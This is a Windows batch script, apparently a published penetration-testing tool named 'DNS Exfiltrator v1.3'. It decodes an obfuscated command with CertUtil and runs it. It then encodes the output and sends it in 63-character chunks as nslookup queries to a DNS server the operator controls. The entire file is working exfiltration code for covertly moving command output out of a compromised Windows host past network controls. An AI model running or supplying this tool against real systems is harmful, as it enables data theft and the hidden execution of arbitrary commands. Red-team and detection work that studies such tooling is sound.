:: Copyright (c) 2021 Ivan Šincek

@echo off
setlocal EnableDelayedExpansion
	echo ################################################################
	echo #                                                              #
	echo #                     DNS Exfiltrator v1.3                     #
	echo #                                by Ivan Sincek                #
	echo #                                                              #
	echo # Exfiltrate data with DNS queries.                            #
	echo # GitHub repository at github.com/ivan-sincek/dns-exfiltrator. #
	echo #                                                              #
	echo ################################################################
	set error=false
	call :validate error %1
	call :validate error %2
	if "!error!" EQU "true" (
		echo Usage: dns_exfiltrator.bat ^<dns-server^> ^<encoding^> ^<enc-command^>
	) else (
		call :exfiltrate %1 %2 %3
	)
endlocal
exit /b 0

:: %1 (required) - error (out)
:: %2 (required) - encoded command
:validate
	if "%~2" EQU "" (
		set %1=true
	)
	exit /b 0

:: %1 (required) - dns server
:: %2 (required) - payload
:send
	setlocal EnableDelayedExpansion
		set data=%2
		set /a count=0
		:while
			set chunk=!data:~%count%,63!
			set /a count=%count%+63
			if "!chunk!" NEQ "" (
				nslookup -retry=5 -timeout=5 -type=a !chunk!.%1
				:: just a little timeout to prevent the race condition while sending queries
				timeout /t 2 /nobreak 1>nul 2>nul
				goto :while
			)
	endlocal
	exit /b 0

:: %1 (required) - dns server
:: %2 (required) - encoding
:: %3 (required) - encoded command
:exfiltrate
	setlocal EnableDelayedExpansion
		set enc=dns_exfil_enc.txt
		set dec=dns_exfil_dec.txt
		echo %~3 > "%enc%"
		CertUtil -f -decode "%enc%" "%dec%" 1>nul 2>nul
		del /f /q "%enc%" 1>nul 2>nul
		if not exist "%dec%" (
			echo Cannot decode the encoded command
		) else (
			for /f "tokens=*" %%i in (%dec%) do (
				set cmd=%%i
			)
			del /f /q "%dec%" 1>nul 2>nul
			for /f "tokens=*" %%i in ('!cmd!') do (
				echo %%i >> "%dec%"
			)
			if "%2" NEQ "hex" (
				CertUtil -f -encode "%dec%" "%enc%" 1>nul 2>nul
			) else (
				CertUtil -f -encodehex "%dec%" "%enc%" 12 1>nul 2>nul
			)
			del /f /q "%dec%" 1>nul 2>nul
			if not exist "%enc%" (
				echo Cannot encode the output
			) else (
				for /f "tokens=*" %%i in (%enc%) do (
					set payload=!payload!%%i
				)
				del /f /q "%enc%" 1>nul 2>nul
				if "%2" NEQ "hex" (
					set payload=!payload:~27,-25!
					:: replace "+" with "plus"
					set payload=!payload:+=plus!
					:: replace "/" with "slash"
					set payload=!payload:/=slash!
					:: replace "=" with "eqls" (dirty)
					set const=eqls
					if "!payload:~-2!" EQU "==" (
						set payload=!payload:~0,-2!!const!!const!
					) else if "!payload:~-1!" EQU "=" (
						set payload=!payload:~0,-1!!const!
					)
					:: remove padding "=" (old)
					REM for /f "tokens=1 delims=^=" %%i in ("!payload!") do (
						REM set payload=%%i
					REM )
				)
				call :send %1 !payload!
			)
		)
	endlocal
	exit /b 0
